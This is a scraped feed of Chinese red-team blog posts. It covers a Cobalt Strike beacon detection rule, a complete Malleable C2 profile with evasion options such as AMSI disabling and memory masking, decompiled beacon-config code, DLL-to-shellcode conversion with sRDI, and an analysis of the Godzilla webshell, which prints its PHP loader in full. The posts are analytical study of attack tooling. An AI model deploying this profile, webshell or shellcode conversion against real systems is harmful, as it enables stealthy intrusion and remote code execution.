00 00 00 00  01 00 00 00 00 00 00 00 (00|01|02|04|08|10) 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00 ?? ?? 00 00 00 00 00 00  02 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00  02 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00  01 00 00 00 00 00 00 00 ?? ?? 00 00 00 00 00 00 }    $cobaltStrikeRule32 = {  00 00 00 00 00 00 00 00  01 00 00 00 (00|01|02|04|08|10) 00 00 00 01 00 00 00 ?? ?? 00 00  02 00 00 00 ?? ?? ?? ??  02 00 00 00 ?? ?? ?? ??  01 00 00 00 ?? ?? 00 00 }  condition: any of them}</code></pre><p>cs的c2profile的sleep_mask是sleep xor加密的算法是否开启<br><img src="https://z3.ax1x.com/2021/09/11/hz64fI.png" alt=""></p><p>sleep.profile</p><pre><code>#This profile is meant to show all of the options available in Malleable C2#Various options# Append random-length string (up to data_jitter value) to http-get and http-post server outputset sample_name &quot;Test Profile&quot;;set dns_idle &quot;0.0.0.0&quot;;set dns_max_txt &quot;252&quot;;set dns_sleep &quot;0&quot;;set dns_stager_prepend &quot;&quot;;set dns_stager_subhost &quot;.stage.123456.&quot;;set dns_ttl &quot;1&quot;;set host_stage &quot;true&quot;; #Host payload for staging over set, setS, or DNS. Required by stagers.set jitter &quot;0&quot;;set maxdns &quot;255&quot;;set pipename &quot;msagent_###&quot;; #Default name of pipe to use for SMB Beacon’s peer-to-peer communication. Each # is replaced witha random hex value.set pipename_stager &quot;status_##&quot;;set sleeptime &quot;60000&quot;; #def sleep in msset smb_frame_header &quot;&quot;;set ssh_banner &quot;Cobalt Strike 4.2&quot;;set tcp_frame_header &quot;&quot;;set tcp_port &quot;4444&quot;;# Defaults for ALL CS set server responseshttp-config {    set headers &quot;Date, Server, Content-Length, Keep-Alive, Connection, Content-Type&quot;;    header &quot;Server&quot; &quot;Apache&quot;;    header &quot;Keep-Alive&quot;&quot;timeout=5, max=100&quot;;    header &quot;Connection&quot;&quot;Keep-Alive&quot;;#   The set trust_x_forwarded_foroption decides if Cobalt Strike uses the# X-Forwarded-For set header to determine the remote address of a request.# Use this option if your Cobalt Strike server is behind an set redirector        set trust_x_forwarded_for &quot;true&quot;;}https-certificate {    set C &quot;US&quot;; #Country    set CN &quot;localhost&quot;; # CN - you will probably nver use this, but don&#39;t leave at localost    set L &quot;San Francisco&quot;; #Locality    set OU &quot;IT Services&quot;; #Org unit    set O &quot;FooCorp&quot;; #Org name    set ST &quot;CA&quot;; #State    set validity &quot;365&quot;;    # if using a valid vert, specify this, keystore = java keystore    #set keystore &quot;domain.store&quot;;    #set password &quot;mypassword&quot;;}#If you have code signing cert:#code-signer {#    set keystore &quot;keystore.jks&quot;;#    set password &quot;password&quot;;#    set alias    &quot;server&quot;;#    set timestamp &quot;false&quot;;#    set timestamp_url &quot;set://timestamp.digicert.com&quot;;#}#Stager is only supported as a GET request and it will use AFAICT the IE on Windows.http-stager {    set uri_x86 &quot;/api/v1/GetLicence&quot;;         set uri_x64 &quot;/api/v2/GetLicence&quot;;    client {        parameter &quot;uuid&quot; &quot;96c5f1e1-067b-492e-a38b-4f6290369121&quot;;        #header &quot;headername&quot; &quot;headervalue&quot;;    }    server {        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;            header &quot;Content-Encoding&quot; &quot;gzip&quot;;            output {                    #GZIP headers and footers            prepend &quot;\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03&quot;;            append &quot;\x7F\x01\xDD\xAF\x58\x52\x07\x00&quot;;            #AFAICT print is the only supported terminator            print;        }    }}#This is used only in http-get and http-post and not during stageset useragent &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;;# define indicators for an set GEThttp-get {    # we require a stub URI to attach the rest of our data to.    set uri &quot;/api/v1/Updates&quot;;    client {        header &quot;Accept-Encoding&quot; &quot;deflate, gzip;q=1.0, *;q=0.5&quot;;        # mask our metadata, base64 encode it, store it in the URI        metadata {            # XOR encode the value            mask;            # URL-safe Base64 Encode            #base64url;            # URL-safe Base64 Encode            base64;            # NetBIOS Encode ‘a’ ?            #netbios;            #NetBIOS Encode ‘A’            #netbiosu;            # You probably want these to be last two, else you will encode these values            # Append a string to metadata            append &quot;;&quot; ;            # Prepend a string            prepend &quot;SESSION=&quot;;            # Terminator statements - these say where the metadata goes            # Pick one            # Append to URI            #uri-append;            #Set in a header            header &quot;Cookie&quot;;            #Send data as transaction body            #print            #Store data in a URI parameter            #parameter &quot;someparam&quot;        }    }    server {        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;        header &quot;Content-Encoding&quot; &quot;gzip&quot;;        # prepend some text in case the GET is empty.        output {            mask;            base64;            prepend &quot;\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03&quot;;            append &quot;\x7F\x01\xDD\xAF\x58\x52\x07\x00&quot;;                        print;        }    }}# define indicators for an set POSThttp-post {    set uri &quot;/api/v1/Telemetry/Id/&quot;;    set verb &quot;POST&quot;;    client {        # make it look like we&#39;re posting something cool.        header &quot;Content-Type&quot; &quot;application/json&quot;;        header &quot;Accept-Encoding&quot; &quot;deflate, gzip;q=1.0, *;q=0.5&quot;;        # ugh, our data has to go somewhere!        output {            mask;            base64url;            uri-append;        }        # randomize and post our session ID        id {            mask;            base64url;            prepend &quot;{version: 1, d=\x22&quot;;                        append &quot;\x22}\n&quot;;            print;        }    }    # The server&#39;s response to our set POST    server {        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;        header &quot;Content-Encoding&quot; &quot;gzip&quot;;        # post usually sends nothing, so let&#39;s prepend a string, mask it, and        # base64 encode it. We&#39;ll get something different back each time.        output {            mask;            base64;            prepend &quot;\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03&quot;;            append &quot;\x7F\x01\xDD\xAF\x58\x52\x07\x00&quot;;                        print;        }    }}stage {#    The transform-x86 and transform-x64 blocks pad and transform Beacon’s# Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.    transform-x86 {        prepend &quot;\x90\x90&quot;;        strrep &quot;ReflectiveLoader&quot; &quot;DoLegitStuff&quot;;    }    transform-x64 {        # transform the x64 rDLL stage, same options as with    }    stringw &quot;I am not Beacon&quot;;    set cleanup &quot;true&quot;;        # Ask Beacon to attempt to free memory associated with                                # the Reflective DLL package that initialized it.    # Override the first bytes (MZ header included) of Beacon&#39;s Reflective DLL.    # Valid x86 instructions are required. Follow instructions that change    # CPU state with instructions that undo the change.#    set magic_mz_x86 &quot;MZRE&quot;;#    set magic_mz_x86 &quot;MZAR&quot;;    # Ask the x86 ReflectiveLoader to load the specified library and overwrite    #  its space instead of allocating memory with VirtualAlloc.    # Only works with VirtualAlloc    #set module_x86 &quot;xpsservices.dll&quot;;    #set module_x64 &quot;xpsservices.dll&quot;;    # Obfuscate the Reflective DLL’s import table, overwrite unused header content,    # and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.    set obfuscate &quot;false&quot;;    # Obfuscate Beacon, in-memory, prior to sleeping    set sleep_mask &quot;true&quot;;    # Use embedded function pointer hints to bootstrap Beacon agent without    # walking kernel32 EAT    set smartinject &quot;true&quot;;    # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after    # it loads Beacon payload    set stomppe &quot;true&quot;;    # Ask ReflectiveLoader to use (true) or avoid RWX permissions (false) for Beacon DLL in memory    set userwx &quot;false&quot;;#    set image_size_x86 &quot;512000&quot;;#    set image_size_x64 &quot;512000&quot;;    set entry_point &quot;92145&quot;;    #The Exported name of the Beacon DLL    #set name &quot;beacon.x64.dll&quot;    #set rich_header  # I don&#39;t understand this yet TODO: fixme    #TODO: add examples process-inject}process-inject {        # set how memory is allocated in a remote process        # VirtualAllocEx or NtMapViewOfSection. The        # NtMapViewOfSection option is for same-architecture injection only.        # VirtualAllocEx is always used for cross-arch memory allocations.        set allocator &quot;VirtualAllocEx&quot;;        # shape the memory characteristics and content        set min_alloc &quot;16384&quot;;        set startrwx &quot;true&quot;;        set userwx &quot;false&quot;;        transform-x86 {        prepend &quot;\x90\x90&quot;;        }        transform-x64 {        # transform x64 injected content        }        # determine how to execute the injected code        execute {            CreateThread &quot;ntdll.dll!RtlUserThreadStart&quot;;            SetThreadContext;            RtlCreateUserThread;        }}post-ex {    # control the temporary process we spawn to    set spawnto_x86 &quot;%windir%\\syswow64\\WerFault.exe&quot;;    set spawnto_x64 &quot;%windir%\\sysnative\\WerFault.exe&quot;;    # change the permissions and content of our post-ex DLLs    set obfuscate &quot;true&quot;;    # pass key function pointers from Beacon to its child jobs    set smartinject &quot;true&quot;;    # disable AMSI in powerpick, execute-assembly, and psinject    set amsi_disable &quot;true&quot;;    #The thread_hint option allows multi-threaded post-ex DLLs to spawn    # threads with a spoofed start address. Specify the thread hint as    # “module!function+0x##” to specify the start address to spoof.    # The optional 0x## part is an offset added to the start address.    # set thread_hint &quot;....TODO:FIXME&quot;}</code></pre><p>根据wx公众号的文章结尾所描述<br><img src="https://z3.ax1x.com/2021/09/11/hz6zpq.png" alt=""></p><p>经过测试确实如此<br><img src="https://z3.ax1x.com/2021/09/11/hzc9XT.png" alt=""></p><p>processhacker Memory所定位看到的内存是xor过的，MZ头也没了<br><img src="https://z3.ax1x.com/2021/09/11/hzcEN9.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/11/hzcm1x.png" alt=""></p><p>还是能检测出来<br><img src="https://z3.ax1x.com/2021/09/11/hzcujK.png" alt=""></p><p>看到的文章中还有一篇是Hook SleepEx函数，然后进行修改 （由于个人过于垃圾无法复现该文章）<br><a href="https://www.arashparsa.com/hook-heaps-and-live-free/" target="_blank" rel="noopener">https://www.arashparsa.com/hook-heaps-and-live-free/</a></p><p>最后就是跟着公众号文章分析了一下cs beacon生成的过程 （详细分析请看wx公众号的文章</p><pre><code>BeaconConfig的生成在 BeaconPayload类的 exportBeaconStage函数中</code></pre><p><img src="https://z3.ax1x.com/2021/09/11/hzcY9I.png" alt=""></p><p>exportBeaconStage</p><pre><code>    protected byte[] exportBeaconStage(int paramInt, String paramString1, boolean paramBoolean1, boolean paramBoolean2, String paramString2)  {    try    {      long l1 = System.currentTimeMillis(); //返回当前世界时间(毫秒)      byte[] arrayOfByte1 = SleevedResource.readResource(paramString2); //读取对应的dll并解密数据      if (paramString1.length() &gt; 254) { //如果长度大于254则只读取0~254        paramString1 = paramString1.substring(0, 254);      }      String[] arrayOfString1 = this.c2profile.getString(&quot;.http-get.uri&quot;).split(&quot; &quot;); //get请求的路径读取      String[] arrayOfString2 = paramString1.split(&quot;,\\s*&quot;); //字符串分割      LinkedList localLinkedList = new LinkedList();      for (int i = 0; i &lt; arrayOfString2.length; i++) //遍历数据添加到localLinkedList      {        localLinkedList.add(arrayOfString2[i]);        localLinkedList.add(CommonUtils.pick(arrayOfString1));      }      while ((localLinkedList.size() &gt; 2) &amp;&amp; (CommonUtils.join(localLinkedList, &quot;,&quot;).length() &gt; 255))      {        str1 = localLinkedList.removeLast() + &quot;&quot;;        String str2 = localLinkedList.removeLast() + &quot;&quot;;        CommonUtils.print_info(&quot;dropping &quot; + str2 + str1 + &quot; from Beacon profile for size&quot;);      }      String str1 = randua(this.c2profile);      int j = Integer.parseInt(this.c2profile.getString(&quot;.sleeptime&quot;)); //c2profile延时时间读取      String str3 = CommonUtils.pick(this.c2profile.getString(&quot;.http-post.uri&quot;).split(&quot; &quot;)); //post请求的路径      byte[] arrayOfByte2 = this.c2profile.recover_binary(&quot;.http-get.server.output&quot;);//server头返回      byte[] arrayOfByte3 = this.c2profile.apply_binary(&quot;.http-get.client&quot;);//client请求      byte[] arrayOfByte4 = this.c2profile.apply_binary(&quot;.http-post.client&quot;);//post client请求      int k = this.c2profile.size(&quot;.http-get.server.output&quot;, 1048576); //get请求返回      int m = Integer.parseInt(this.c2profile.getString(&quot;.jitter&quot;));      if ((m &lt; 0) || (m &gt; 99)) {        m = 0;      }      int n = Integer.parseInt(this.c2profile.getString(&quot;.maxdns&quot;));      if ((n &lt; 0) || (n &gt; 255)) {        n = 255;      }      int i1 = 0;      if (paramBoolean1) {        i1 |= 0x1;      }      if (paramBoolean2) {        i1 |= 0x8;      }      long l2 = CommonUtils.ipToLong(this.c2profile.getString(&quot;.dns_idle&quot;));      int i2 = Integer.parseInt(this.c2profile.getString(&quot;.dns_sleep&quot;)); //dns延迟读取      Settings localSettings = new Settings(); //beacon配置      localSettings.addShort(1, i1);      localSettings.addShort(2, paramInt);      localSettings.addInt(3, j);      localSettings.addInt(4, k);      localSettings.addShort(5, m);      localSettings.addShort(6, n);      localSettings.addData(7, this.publickey, 256);      localSettings.addString(8, CommonUtils.join(localLinkedList, &quot;,&quot;), 256);      localSettings.addString(9, str1, 128);      localSettings.addString(10, str3, 64);      localSettings.addData(11, arrayOfByte2, 256);      localSettings.addData(12, arrayOfByte3, 256);      localSettings.addData(13, arrayOfByte4, 256);      localSettings.addData(14, CommonUtils.asBinary(this.c2profile.getString(&quot;.spawnto&quot;)), 16);      localSettings.addString(29, this.c2profile.getString(&quot;.post-ex.spawnto_x86&quot;), 64);      localSettings.addString(30, this.c2profile.getString(&quot;.post-ex.spawnto_x64&quot;), 64);      localSettings.addString(15, &quot;&quot;, 128);      localSettings.addShort(31, QuickSecurity.getCryptoScheme());      localSettings.addInt(19, (int)l2);      localSettings.addInt(20, i2);      localSettings.addString(26, this.c2profile.getString(&quot;.http-get.verb&quot;), 16);      localSettings.addString(27, this.c2profile.getString(&quot;.http-post.verb&quot;), 16);      localSettings.addInt(28, this.c2profile.shouldChunkPosts() ? 96 : 0);      localSettings.addInt(37, this.c2profile.getInt(&quot;.watermark&quot;));      localSettings.addShort(38, this.c2profile.option(&quot;.stage.cleanup&quot;) ? 1 : 0);      localSettings.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);      String str4 = this.listener.getHostHeader();      if ((str4 == null) || (str4.length() == 0)) {        localSettings.addString(54, &quot;&quot;, 128);      } else if (Profile.usesHostBeacon(this.c2profile)) {        localSettings.addString(54, &quot;&quot;, 128);      } else {        localSettings.addString(54, &quot;Host: &quot; + this.listener.getHostHeader() + &quot;\r\n&quot;, 128);      }      if (Profile.usesCookieBeacon(this.c2profile)) {        localSettings.addShort(50, 1);      } else {        localSettings.addShort(50, 0);      }      ProxyServer localProxyServer = ProxyServer.parse(this.listener.getProxyString()); //代理      localProxyServer.setup(localSettings);      setupPivotFrames(this.c2profile, localSettings);      setupKillDate(localSettings);      setupGargle(localSettings, paramString2);      new ProcessInject(this.c2profile).apply(localSettings);      byte[] arrayOfByte5 = localSettings.toPatch();      arrayOfByte5 = beacon_obfuscate(arrayOfByte5); //xor      String str5 = CommonUtils.bString(arrayOfByte1);      int i3 = str5.indexOf(&quot;AAAABBBBCCCCDDDDEEEEFFFF&quot;);      str5 = CommonUtils.replaceAt(str5, CommonUtils.bString(arrayOfByte5), i3);      return CommonUtils.toBytes(str5);    }    catch (IOException localIOException)    {      MudgeSanity.logException(&quot;export Beacon stage: &quot; + paramString2, localIOException, false);    }    return new byte[0];  }</code></pre>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DLL转shellcode研究</title>
      <link href="/posts/8f26af05.html"/>
      <url>/posts/8f26af05.html</url>
      <content type="html"><![CDATA[<p>昨天重新看到了dll转shellcode的文章想分析一下原理，所以<br>有了这篇文章。</p><h2 id="实现DLL加载两个方法"><a href="#实现DLL加载两个方法" class="headerlink" title="实现DLL加载两个方法"></a>实现DLL加载两个方法</h2><p>1.从DIRECTORY_ENTRY_EXPORT寻找ReflectiveLoader函数，修补之后利用该函数加载DLL<br>2.实现一段LoadPE的shellcode，DLL跟在后面</p><h2 id="DLL加载原理"><a href="#DLL加载原理" class="headerlink" title="DLL加载原理"></a>DLL加载原理</h2><blockquote><p>启动一个可执行模块的时候,操作系统的加载程序会先为进程创建虚拟地址空间,接着把可执行模块映射到进程的地址空间中.之后加载程序会检查可执行模块的导入段, 试图对所需的DLL进行定位并将它们映射到进程的地址空间中. 由于导入段只包含DLL的名称,不包含DLL的路径,因此加载程序必须在用户的磁盘上搜索DLL. 下面是加载程序的搜索顺序: (1) 包含可执行文件的目录; (2) Windows的系统目录; GetSystemDirctory (3) 16位的系统目录, 即Windows/System (4) Windows目录 GetWindowsDirectory (5) 进程的当前目录; (6) PATH 环境变量中所列出的目录;</p></blockquote><h2 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h2><p><a href="https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1" target="_blank" rel="noopener">https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1</a></p><pre><code class="powershell">import-module \.ConvertTo-Shellcode.ps1$c=ConvertTo-Shellcode .\test.dll$d=$c |%{write-output ([system.string]::format(&#39;{0:X2}&#39;,$_))}$d -join &quot;&quot; | Out-File shellcode.txt</code></pre><p>得到shellcode.txt py转换一下直接执行shellcode或者把得到的十六进制用010editor十六进制写入到某文件嵌套到资源里读取执行<br><img src="https://z3.ax1x.com/2021/09/09/hL2CM4.png" alt=""></p><p>shellcode执行测试<br><img src="https://z3.ax1x.com/2021/09/09/hL28ot.png" alt=""></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>它的原理是在不改变MZ标志的情况下把整个dll文件修补成可被当作shellcode加载的格式，具体的操作为在dll内导出自加载函数(ReflectiveLoader)然后讲MZ头起始字节修改成执行ReflectiveLoader函数的硬编码</p><p>WBG的描述:</p><blockquote><p>其实所谓的修补反射dll其实就是修改dll头部让其变成汇编指令去调用ReflectiveLoader函数然后ReflectiveLoader函数会经过一系列处理最后会调用DllMain。这时这个dll就像shellcode一样可以直接执行，其实我们所做的就是解析dll找到ReflectiveLoader函数并将其地址硬编码写到Dll头部然后call</p></blockquote><p>自己实现具体过程：</p><ol><li>定位DLL文件在内存中的基址</li><li>获取所需的系统API</li><li>分配一片用来装载DLL的空间</li><li>复制PE文件头和各个节</li><li>处理DLL的引入表</li><li>对DLL进行重定位</li><li>调用DLL入口点</li></ol><p>目前网上的版本有两种：</p><pre><code>* 带解压缩的版本：先把dll压缩然后在构造一段解压数据的C编译后提取ASM，然后将DLL拼接到后面 -&gt;看雪那个就是这样* 不带压缩版本：直接修补，去掉MZ头</code></pre><p>两个版本的都看了分析一下<br>带压缩版本的：利用RtlGetCompressionWorkSpaceSize和RtlCompressBuffer实现数据压缩，然后修补DLL<br><img src="https://z3.ax1x.com/2021/09/09/hLRQpT.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLRbEn.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLRvgU.png" alt=""></p><p>WBG版本的修补:</p><pre><code>* 从DIRECTORY_ENTRY_EXPORT寻找ReflectiveLoader函数，修补之后利用该函数加载DLL</code></pre><p><img src="https://z3.ax1x.com/2021/09/09/hLW3PP.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLWtKg.png" alt=""></p><p>ConvertTo-Shellcode.py分析<br>-&gt;读取DLL数据，传入ConvertToShellcode() -&gt; 中间调用了一个HashFunctionName函数计算arguments.function_name<br><img src="https://z3.ax1x.com/2021/09/09/hLW05q.png" alt=""></p><p>HashFunction函数<br><img src="https://z3.ax1x.com/2021/09/09/hLWfaR.png" alt=""><br>（计算函数hash）<br><img src="https://z3.ax1x.com/2021/09/09/hLWIG6.png" alt=""></p><p>ConvertToShellcode函数<br>-&gt;判断DLL是否为64位<br>-&gt;根据对应的位数取LoadPE的shellcode<br>-&gt;bootstrap拼接对应的指令<br>-&gt;bootstrap + rdiShellcode + dllBytes + userData<br><img src="https://z3.ax1x.com/2021/09/09/hLWbse.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLWXdA.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLWzJP.png" alt=""></p><p>大概如下：</p><pre><code>call &lt;xxx&gt;pop eaxpush ebpmov ebp,espmov edx,eaxadd eax,&lt;DLL偏移量&gt;add edx,&lt;DLL偏移量&gt;+&lt;DLL大小&gt;push &lt;flags&gt;push 0push edxpush &lt;functionHash&gt;push eaxcall &lt;DLL&gt;add esp,0x14leaveret.............&lt;LOADPE_ShellCode&gt;.............&lt;DLLBytest&gt;</code></pre><p>指定dll生成bin，丢golink生成exe<br><img src="https://z3.ax1x.com/2021/09/09/hLfKQU.png" alt=""></p><p>入口点：<br><img src="https://z3.ax1x.com/2021/09/09/hLfYJx.png" alt=""></p><p>dword_401C04是DLL bytes<br><img src="https://z3.ax1x.com/2021/09/09/hLfaQO.png" alt=""></p><p>-&gt;从PEB里寻找ntdll.dll的LdrLoadDLL函数<br>-&gt;从PEB里寻找ntdll.dll的LdrGetProcAddress函数<br>-&gt;利用LdrLoadDLL加载Kernel32.dll<br>    -&gt;加载VirtuaLLoc函数<br>    -&gt;加载VirtualProtect函数<br>    -&gt;加载FlushInstructionCache函数<br>    -&gt;加载GetNativeSysteminfo函数<br>    -&gt;加载Sleep函数<br>    -&gt;加载RtlAddFunctionTable函数<br>    -&gt;加载LoadlibraryA函数<br>-&gt;判断对应的DLL函数是否加载成功<br>-&gt;DLL各个区段赋值变量<br>-&gt;调用GetNativeSystemInfo函数<br>-&gt;Virtualloc修改内存可读可写<br>-&gt;复制PE文件头和各个节<br>-&gt;处理DLL的引入表<br>-&gt;对DLL进行重定位<br>-&gt;调用FlushInstructionCache刷新内存<br>-&gt;加载DLLMain函数<br><img src="https://z3.ax1x.com/2021/09/09/hLfrTA.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLf6Yt.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLf2Sf.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLf4mQ.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLfITs.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLfHf0.png" alt=""></p><p>最后的启动顺序<br>（图片来源WBG）<br><img src="https://z3.ax1x.com/2021/09/09/hLfLlT.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>参考链接：<br><a href="https://wbglil.github.io/2020/03/27/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84dll%E4%BF%AE%E8%A1%A5/" target="_blank" rel="noopener">https://wbglil.github.io/2020/03/27/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84dll%E4%BF%AE%E8%A1%A5/</a><br><a href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-shellcode-dll-injection" target="_blank" rel="noopener">https://www.ired.team/offensive-security/code-injection-process-injection/reflective-shellcode-dll-injection</a><br><a href="https://idiotc4t.com/defense-evasion/reflectivedllinjection-variation" target="_blank" rel="noopener">https://idiotc4t.com/defense-evasion/reflectivedllinjection-variation</a><br><a href="https://www.cnblogs.com/h2zZhou/p/7721797.html" target="_blank" rel="noopener">https://www.cnblogs.com/h2zZhou/p/7721797.html</a></p><p>现成工具:<br><a href="https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1" target="_blank" rel="noopener">https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1</a><br><a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">https://github.com/stephenfewer/ReflectiveDLLInjection</a> - 划重点</p><p>WBG的项目:<br><a href="https://github.com/WBGlIl/ReflectiveDLL_Patch/blob/master/ReflectiveDLL_Patch.py" target="_blank" rel="noopener">https://github.com/WBGlIl/ReflectiveDLL_Patch/blob/master/ReflectiveDLL_Patch.py</a><br><a href="https://github.com/WBGlIl/go-ReflectiveDLL" target="_blank" rel="noopener">https://github.com/WBGlIl/go-ReflectiveDLL</a></p><p>看雪的项目:<a href="https://github.com/killeven/DllToShellCode/tree/master/DllToShellCode" target="_blank" rel="noopener">https://github.com/killeven/DllToShellCode/tree/master/DllToShellCode</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>哥斯拉实现meterpreter分析</title>
      <link href="/posts/19caa6fb.html"/>
      <url>/posts/19caa6fb.html</url>
      <content type="html"><![CDATA[<p>哥斯拉version:1.0<br>Cryption:PHP_XOR_BASE64<br>这里分析的php首先定位到shells/plugins/php/assets/Meterpreter.class</p><pre><code>* 先获取对于payload类型，然后从对应payload目录下读取反弹meterpreter的payload文件 （对应路径：plugins/&lt;scriptname&gt;/assets）* 调用对应payload里的include函数* include函数调用evalFunc，发送POST请求调用大马里的includeCode函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccpa8.png" alt=""></p><p>调用对应payload里的include函数<br><img src="https://z3.ax1x.com/2021/09/04/hcc9IS.png" alt=""></p><p>通过get函数获取到$parameter数组里对应的binCode和codeName的value，最后写在session里（将反弹meterprter的payload拼接写到存大马的session文件里）<br><img src="https://z3.ax1x.com/2021/09/04/hccPPg.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/04/hcckxs.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/04/hccEMn.png" alt=""></p><p>抓包如下<br><img src="https://z3.ax1x.com/2021/09/04/hccVrq.png" alt=""></p><p>之后点击Go Button后触发GoButtonClick事件</p><pre><code>* 发送POST请求调用大马里对应的run函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccZq0.png" alt=""></p><p>Run函数</p><pre><code>* 获取传送过来的数据做好好下步划分的准备* 判断是否要进行bypass_open_basedir* 调用evalFunc函数执行反弹meterprter的code</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccmZV.png" alt=""></p><p>就是<code>eval($_SESSION[&quot;Meterpreter&quot;])</code><br><img src="https://z3.ax1x.com/2021/09/04/hccuIU.png" alt=""></p><p>抓包如下<br>第二个PHPSESSIONID对应<code>$_SESSION[&quot;meterpter&quot;]</code><br><img src="https://z3.ax1x.com/2021/09/04/hccMiF.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/04/hccQG4.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 工具刨析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>哥斯拉整体过程刨析</title>
      <link href="/posts/befc239e.html"/>
      <url>/posts/befc239e.html</url>
      <content type="html"><![CDATA[<p>本文主要是分析哥斯拉流量协议实现的过程</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>版本:v1.0<br>有效荷载:Phpdynxxxxx<br>加密器:php_xor_base64</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><pre><code class="php">&lt;?php    session_start();    @set_time_limit(0);    @error_reporting(0);    function E($D,$K){ //$D是base64解密后的数据,$K是key        for($i=0;$i&lt;strlen($D);$i++) {            $D[$i] = $D[$i]^$K[$i+1&amp;15]; //XOR解密数据        }        return $D;    }    function Q($D){        return base64_encode($D);    }    function O($D){        return base64_decode($D);    }    $P=&#39;pass&#39;;    $V=&#39;payload&#39;;    $T=&#39;3c6e0b8a9c15224a&#39;; //KEY    if (isset($_POST[$P])){ //检测密码字段是否存在POST请求        $F=O(E(O($_POST[$P]),$T)); //先base64解密数据，XOR运算解密数据，base64在解密xor解密后的数据        if (isset($_SESSION[$V])){ //检测SESSION是否存在 (对应SESSION 临时文件存放的shell)            $L=$_SESSION[$V]; //SESSION数据读取            $A=explode(&#39;|&#39;,$L); //分割|            class C{public function nvoke($p) {eval($p.&quot;&quot;);}} //执行命令            $R=new C();            $R-&gt;nvoke($A[0]); //调用nvoke函数            echo substr(md5($P.$T),0,16); //md5加密$p和$T，截断0到16位 （输出两次-&gt;开头&lt;data&gt;结尾）方便client提取返回内容            echo Q(E(@run($F),$T)); //输出结果            echo substr(md5($P.$T),16);        }else{            $_SESSION[$V]=$F;        }    }</code></pre><p>整体步骤如下：<br>1.一开始是没有session的，第一次把传过来的数据（大马）解密（base64_Decode-&gt;Xor_Decode-&gt;Base64_decode）写入到session，产生临时文件<br>    -&gt; Server返回带有session编号的cookie返回给client （ Example:Set-Cookie: PHPSESSID=064ef1kh9kjhmp9k46rvejh396; path=/）<br>    -&gt; Client接到带有PHPSESSID后，后续的请求都带上PHPSESSID<br>2.往后调用对应的功能pass字段就会调用对应大马里的函数</p><p>session产生的临时文件里的大马 （对应的脚本语言对应jar目录下的shells/payloads/<scriptname>/assets/）<br><img src="https://z3.ax1x.com/2021/09/03/hcEbUs.png" alt=""></scriptname></p><p>jeb反编译Godzilla.jar<br>定位到core/ui/component/dialog/ShellSetting.Class<br>在配置shell的时候步骤如下<br><img src="https://z3.ax1x.com/2021/09/03/hcEX80.png" alt=""></p><p>调用updateTempShellEntity更新模板对应的设置<br><img src="https://z3.ax1x.com/2021/09/03/hcVSrF.png" alt=""></p><p>initShellOpertion函数<br>(PayloadModel-&gt;对应你设置时选择的有效荷载，CryptModel-&gt;对应你设置时选择的加密器)</p><pre><code>* 返回http对象* 返回对应的payloadModel class对象* 返回对应的cryptModel class对象* 调用CryptModel.init函数* 调用payloadModel.init函数* 调用payloadModel.test函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hc6oVK.png" alt=""></p><p>getPayload函数<br><img src="https://z3.ax1x.com/2021/09/04/hc6bPe.png" 